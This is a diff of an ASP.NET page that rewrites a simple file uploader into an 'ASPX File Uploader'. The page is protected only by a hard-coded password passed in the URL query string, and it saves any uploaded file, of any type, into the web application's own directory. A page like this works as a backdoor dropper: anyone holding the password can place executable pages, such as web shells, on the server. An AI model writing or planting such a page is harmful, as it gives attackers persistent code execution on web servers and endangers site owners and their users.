@@ -1,11 +1,9 @@
-<%@ Page Language="C#" %>
+<%@ Page Language="C#" AutoEventWireup="true" %>
 <%@ Import Namespace="System.IO" %>
-
-<%@
-
-// ===== CONFIG =====
-    string PASSWORD = "admin987654321!@";  // Change this to your password
-    string UPLOAD_DIR = Server.MapPath("."); // Current directory
+<%
+    // ===== CONFIG =====
+    string PASSWORD = "mypassword";  // ← URL me ?p=mypassword
+    string UPLOAD_DIR = Server.MapPath("."); // Current folder
 
     // ===== AUTH CHECK =====
     string p = Request.QueryString["p"];
@@ -15,101 +13,61 @@
         Response.Write("Access Denied");
         Response.End();
     }
-    
-%>
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<script runat="server">
-    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
-    private const string FOOTER = "</body>\n</html>\n";
-
-    /// <summary>
-    /// 
-    /// </summary>
-    /// <param name="sender"></param>
-    /// <param name="e"></param>
-    protected void Page_Load(object sender, EventArgs e)
+    // ===== UPLOAD LOGIC =====
+    string message = "";
+    if (IsPostBack)
     {
-        try
+        if (Request.Files.Count > 0)
         {
-            if (Request.Params["operation"] != null)
+            var file = Request.Files[0];
+            if (file != null && file.ContentLength > 0)
             {
-                if (Request.Params["operation"] == "upload")
+                string fileName = Path.GetFileName(file.FileName);
+                string savePath = Path.Combine(UPLOAD_DIR, fileName);
+
+                try
                 {
-                    Response.Write(HEADER);
-                    Response.Write(this.UploadFile());
-                    Response.Write(FOOTER);
+                    file.SaveAs(savePath);
+                    message = "✅ File uploaded successfully!<br>";
+                    message += "File Name: " + Server.HtmlEncode(fileName) + "<br>";
+                    message += "Location: Current Directory<br>";
                 }
-                else
+                catch (Exception ex)
                 {
-                    Response.Write(HEADER);
-                    Response.Write("Unknown operation");
-                    Response.Write(FOOTER);
+                    message = "❌ Upload failed: " + Server.HtmlEncode(ex.Message);
                 }
             }
             else
             {
-                Response.Write(HEADER);
-                Response.Write(this.GetUploadControls());
-                Response.Write(FOOTER);
+                message = "❌ No file selected or empty file.";
             }
         }
-        catch (Exception ex)
+        else
         {
-            Response.Write(HEADER);
-            Response.Write(ex.Message);
-            Response.Write(FOOTER);
+            message = "❌ No files detected in request.";
         }
     }
+%>
 
-    /// <summary>
-    /// 
-    /// </summary>
-    private string UploadFile()
-    {
-        try
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ASPX File Uploader</title>
+</head>
+<body>
+    <h2>ASPX File Uploader</h2>
+
+    <%
+        if (!string.IsNullOrEmpty(message))
         {
-            if (Request.Files.Count != 1)
-            {
-                return "No file selected";
-            }
-
-            HttpPostedFile httpPostedFile = Request.Files[0];
-
-            int fileLength = httpPostedFile.ContentLength;
-            byte[] buffer = new byte[fileLength];
-            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
-
-            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
-            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
-            {
-                fileStream.Write(buffer, 0, buffer.Length);
-            }
-
-            return "File uploaded";
+            Response.Write("<div style='border:1px solid #ccc; padding:10px; margin-bottom:10px;'>" + message + "</div>");
         }
-        catch (Exception ex)
-        {
-            return ex.ToString();
-        }
-    }
+    %>
 
-    /// <summary>
-    /// 
-    /// </summary>
-    /// <returns></returns>
-    private string GetUploadControls()
-    {
-        string temp = string.Empty;
-
-        temp = "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
-        temp += "<p>Please specify a file: <input type=\"file\" name=\"file\"></p>";
-        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
-        temp += "</form>";
-
-        return temp;
-    }
-</script>
-
-<!-- Created by Mark Woan (http://www.woany.co.uk) -->
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="file" required>
+        <button type="submit">Upload</button>
+    </form>
+</body>
+</html>
